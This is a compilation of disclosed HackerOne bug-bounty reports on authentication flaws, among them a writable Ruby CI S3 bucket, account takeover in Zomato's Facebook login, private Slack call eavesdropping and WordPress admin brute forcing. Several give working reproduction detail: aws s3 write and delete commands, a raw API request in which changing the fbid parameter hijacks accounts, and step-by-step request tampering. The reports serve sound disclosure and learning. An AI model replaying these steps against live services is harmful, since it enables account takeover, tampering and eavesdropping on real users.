### [Open S3 Bucket WriteAble To Any Aws User](https://hackerone.com/reports/209223)

- **Report ID:** `209223`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Ruby
- **Reporter:** @injector404
- **Bounty:** - usd
- **Disclosed:** 2017-03-29T23:22:24.322Z
- **CVE(s):** -

**Vulnerability Information:**

Hi All,
I know that http://rubyci.s3.amazonaws.com is used for file uploads on reports and so when i open your s3 bucket i able see all of your public/private files i already see you fix this vulnerability but it not completely fixed
 
	root@injector:~# aws s3 ls s3://rubyci
	                           PRE aix71_ppc/
	                           PRE amazon/
	                           PRE arch/
	                           PRE archive/
	                           PRE armv8b/
	                           PRE c64b/
	                           PRE centos5-32/
	                           PRE centos5-64/
	                           PRE centos7/
	                           PRE debian/
	                           PRE debian7/
	                           PRE debian8/
	                           PRE f19p8/
	                           PRE fedora20/
	                           PRE fedora21/
	                           PRE fedora22/
	                           PRE fedora23/
	                           PRE fedora24/
	                           PRE fedora25/
	                           PRE freebsd10-zfs/
	                           PRE freebsd11zfs/
	                           PRE freebsd82-32/
	                           PRE freebsd82-64/
	                           PRE funtoo/
	                           PRE gentoo/
	                           PRE icc-x64/
	                           PRE opensuse13/
	                           PRE opensuseleap/
	                           PRE osx1010/
	                           PRE osx1011/
	                           PRE rhel_zlinux/
	                           PRE scw-9d6766/
	                           PRE tk2-243-31075/
	                           PRE ubuntu/
	                           PRE ubuntu1004-32/
	                           PRE ubuntu1004-64/
	                           PRE ubuntu1404/
	                           PRE ubuntu1410/
	                           PRE ubuntu1510/
	                           PRE ubuntu1604/
	                           PRE unstable10s/
	                           PRE unstable10x/
	                           PRE unstable11s/
	                           PRE unstable11x/
	2017-02-17 13:03:14        112 test.html
	2017-02-27 09:52:15         20 test.txt

any one who have aws s3 cli can write in your bucket because your bucket writable through aws cli
when i try to move and delete any file on your bucket i got this
###MOVED
	root@injector:~# aws s3 mv test.txt s3://rubyci
	move: ./test.txt to s3://rubyci/test.txt 
###DELETED
	root@injector:~# aws s3 rm s3://rubyci/test.txt
	delete: s3://rubyci/test.txt

any one using aws cli can move and delete any file from your bucket
also check the attached picture and feel free to contact if you need any additional info

Best Regard
Saad Ahmed

---

### [Unauthorised Access to Anyone's User Account](https://hackerone.com/reports/202921)

- **Report ID:** `202921`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Eternal
- **Reporter:** @bhavukjain1
- **Bounty:** - usd
- **Disclosed:** 2017-03-28T22:13:53.396Z
- **CVE(s):** -

**Vulnerability Information:**

When we do Login with Facebook on the Zomato app, you're doing zero authentication of the user. I'm able to hack into the targeted user's accounts by just using the Facebook ID.

Affected API raw request:

POST /v2/auth.json?presentlat=28.66505699180115&useragent=model_iPod%20touch__os_9.3.5__v_7.0__t_iPod5,1&app_version=7.0&session_id=41&app_run_id=21&presentlon=77.32215271029096&lang=en&push_permission=1&isFacebook=true&channel_url=&uuid=█████████ HTTP/1.1
Host: 1api.zomato.com
Accept-Language: en-IN;q=1, nl-IN;q=0.9, it-IN;q=0.8, de-IN;q=0.7, fr-IN;q=0.6
Accept: */*
User-Agent: Zomato/6.6.9 (iPod touch; iOS 9.3.5; Scale/2.00)
X-Zomato-API-Key: █████████
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: keep-alive
app_version: 7.0
Cookie: PHPSESSID=██████████; fbcity=1; fbtrack=c9bce885893ad8387ae3dc855d6f5b97; zl=en
Content-Length: 984
Accept-Encoding: gzip

access_token=&client_id=zomato_ios_v2&fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D&fb_token=████████&fbdata=%7B%0A%20%20%22link%22%20%3A%20%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fapp_scoped_user_id%5C%2F█████%5C%2F%22%2C%0A%20%20%22id%22%20%3A%20%22██████████%22%2C%0A%20%20%22first_name%22%20%3A%20%22Bhavuk%22%2C%0A%20%20%22name%22%20%3A%20%22Bhavuk%20Jain%22%2C%0A%20%20%22gender%22%20%3A%20%22male%22%2C%0A%20%20%22last_name%22%20%3A%20%22Jain%22%2C%0A%20%20%22email%22%20%3A%20%22█████████%40yahoo.co.in%22%2C%0A%20%20%22locale%22%20%3A%20%22en_US%22%2C%0A%20%20%22timezone%22%20%3A%205.5%2C%0A%20%20%22updated_time%22%20%3A%20%222016-12-24T21%3A55%3A30%2B0000%22%2C%0A%20%20%22verified%22%20%3A%20true%0A%7D&fbid=█████

In the last parameter, "fbid", I just need to replace it with the targeted user's facebook id, and I've been given the access to that user account. 
For eg, just replace the "fbid" parameter with ███. You'll gain the access to this user's account.

Also, using my Facebook access token, I'm able to get the correct facebook ids of the people I'm friends on Facebook with and also the ids of second degree friends as well. So I'm able to hack into their Zomato accounts with ease.

---

### [Password reset vulnerability on a DoD website](https://hackerone.com/reports/194308)

- **Report ID:** `194308`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @sp1d3rs
- **Bounty:** - usd
- **Disclosed:** 2017-03-16T17:32:33.092Z
- **CVE(s):** -

**Summary (team):**

A password reset vulnerability was found on a DoD website, which could have allowed a malicious user to identify legitimate users and arbitrarily reset their passwords. @sp1d3rs was able to demonstrate this vulnerability by accessing a DoD webpage. Thanks @sp1d3rs!

---

### [Writable RubyCi Amazon s3 bucket](https://hackerone.com/reports/207053)

- **Report ID:** `207053`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Ruby
- **Reporter:** @dataalchemist
- **Bounty:** 500 usd
- **Disclosed:** 2017-02-27T02:05:26.852Z
- **CVE(s):** -

**Vulnerability Information:**

Hello, I have discovered that the bucket:
http://rubyci.s3.amazonaws.com/
is able to be written to by authenticated aws users. This is due to the current permissions configurations
I have added a file here:
http://rubyci.s3.amazonaws.com/test.html
for proof of concept. This can be potentially dangerous to your users and website, as any of the web content in this bucket may be replaced with malicious files. 
More info about these permissions can be found here: http://docs.aws.amazon.com/AmazonS3/latest/dev/s3-access-control.html

---

### [Authentication bypass vulnerability on a DoD website](https://hackerone.com/reports/187705)

- **Report ID:** `187705`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @spam404
- **Bounty:** - usd
- **Disclosed:** 2017-02-15T21:52:17.838Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense website was exposed to an authentication bypass vulnerability which could have allowed an unauthenticated user to browse the website as an authenticated user. Thanks to @spam404 for discovering this vulnerability!

---

### [Misconfigured password reset vulnerability on a DoD website](https://hackerone.com/reports/193932)

- **Report ID:** `193932`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** U.S. Dept Of Defense
- **Reporter:** @thirup
- **Bounty:** - usd
- **Disclosed:** 2017-02-15T21:12:22.037Z
- **CVE(s):** -

**Summary (team):**

A Department of Defense website was mis-configured such that the password reset function could be bypassed to change a user's password. @mthirup was able to demonstrate this vulnerability by crafting a specially formatted URL. Thanks @mthirup!

---

### [Eavesdropping on private Slack calls](https://hackerone.com/reports/184698)

- **Report ID:** `184698`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Slack
- **Reporter:** @michiel
- **Bounty:** 1000 usd
- **Disclosed:** 2017-02-08T21:14:04.833Z
- **CVE(s):** -

**Vulnerability Information:**

A vulnerability exists in Slack's call functionality that allows a team member to eavesdrop on private ongoing Slack calls by inviting themselves into the conversation without the permission from either participant. By doing so they can eavesdrop on co-workers' private conversations as well as taking part in these conversations. To make the attack less obvious, the attacker could re-use Slackbot's avatar and choose a username that is similar to Slackbot. Another scenario would be to pick the avatar of the person you want to impersonate and choose a username that is similar to theirs. 

## Setup
Before trying to reproduce the vulnerability, make sure you have the following:
- Slack Calls should be enabled in your Slack instance.
- Have at least two accounts you control. One we will call the Main Account, the other one we will call the Eavesdropper Account.
- Have at least two accounts you do not control on the same Slack instance. They will be used to mock the situation of two co-workers having a private Slack call.
- For easy reproduction, it is advised to initiate the call from a web browser rather than a native app.
- Make sure to have some type of intercepting proxy running that allows you to record HTTP requests and replay them easily.

## Steps to Reproduce
### Obtaining the vulnerable request
First off, we are going to obtain the exact request to the endpoint that contains the vulnerability (`/api/screenhero.rooms.invite`). This will be needed to later on modify and add Eavesdropper Account to the private call. 

Set up a call and invite someone to the call. Make sure to capture the request to `/api/screenhero.rooms.invite` and save it so you can replay it easily later. The request should look something like:

```
POST /api/screenhero.rooms.invite?_x_id=91700980-1479951838.521 HTTP/1.1
Host: hackerone.slack.com
Origin: https://hackerone.slack.com
X-Slack-Version-Ts: 1479949022
[...]

is_video_call=false&responder=U0254GYNR&room=R36L2K8P6&set_active=true&should_share=true&token=<snip>
```

### Staging the attack environment
Start by setting up a 1:1 call between two users (both accounts you don't necessarily have control over). This is to mock a situation where two co-workers are on a private 1:1 Slack call. 

Note the Screenhero room ID of the call. You will need this later. In this scenario, I am going to assume the attacker is already in possession of the room ID. The room ID can be recognized by the ID after `/call/` in https://hackerone.slack.com/call/R36L2K8P6 (an example).

### Pulling off the attack
Take the request you saved earlier, and now modify the request as follows:
- change the value of the `room` parameter to the room ID you noted from the previous step
- change the value of the `responder` to the user ID of Eavesdropper Account. The reason why this can't be your own user ID (Main Account) is that you're not allowed to invite `self`. 

After these changes, forward the request and wait for a call on Eavesdropper Account. When you accept this call, you will be placed into the private conversation the two victims were having. 

Let me know if there's anything else you need to validate this issue.

---

### [BruteForce in to Admin Account](https://hackerone.com/reports/188205)

- **Report ID:** `188205`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** Nextcloud
- **Reporter:** @hackerwahab
- **Bounty:** - usd
- **Disclosed:** 2016-12-04T18:49:18.782Z
- **CVE(s):** -

**Vulnerability Information:**

Hello,

My self Abdulwahab,
 I want to Alert You that Your website is Facing a serious Problem Called : Username Enumeration
This Problem is on
nextcloud.com/wp-admin

We Use wpscan to get username 

and the username is 
"frank"
After getting username a user can Bruteforce it Using Wpscan and get access to admin panel and upload shell and also get all sub_domain Means Full Server is Hacked!

FIX
===
To Fix this use Wordpress Login Attemptizer

Thanks,
ABDULWAHAB,
Independent Cyber Security Researcher,

---

### [AWS Signature Disclosure in www.digitalsellz.com allows access to S3](https://hackerone.com/reports/170052)

- **Report ID:** `170052`
- **Severity:** High
- **Weakness:** Improper Authentication - Generic
- **Program:** DigitalSellz
- **Reporter:** @skorov
- **Bounty:** - usd
- **Disclosed:** 2016-11-27T23:08:43.055Z
- **CVE(s):** -

**Summary (team):**

@skorov discovered a vulnerability that allows a user can gain access to S3. This Vulnerability has been fixed.

**Summary (researcher):**

An information disclosure vulnerability was found that allowed an attacker to have arbitrary AWS requests signed with the secret key. The signature could then be used to view, edit, upload and delete any file in the S3 bucket.

DigitalSellz team had great communication and acted quickly to remediate the vulnerability.

---

### [Subdomain Takeover on http://kiosk.owox.com/](https://hackerone.com/reports/182576)

- **Report ID:** `182576`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** OWOX, Inc.
- **Reporter:** @hax0rgb
- **Bounty:** - usd
- **Disclosed:** 2016-11-17T17:34:23.254Z
- **CVE(s):** -

**Summary (team):**

Subdomain http://kiosk.owox.com/ was preserved from being taken over by an attacker.

---

### [Unsecured Grafana instance](https://hackerone.com/reports/182234)

- **Report ID:** `182234`
- **Severity:** Critical
- **Weakness:** Improper Authentication - Generic
- **Program:** Pushwoosh
- **Reporter:** @abc12345
- **Bounty:** - usd
- **Disclosed:** 2016-11-15T08:11:47.133Z
- **CVE(s):** -

**Summary (team):**

Unsecured Grafana instance

---
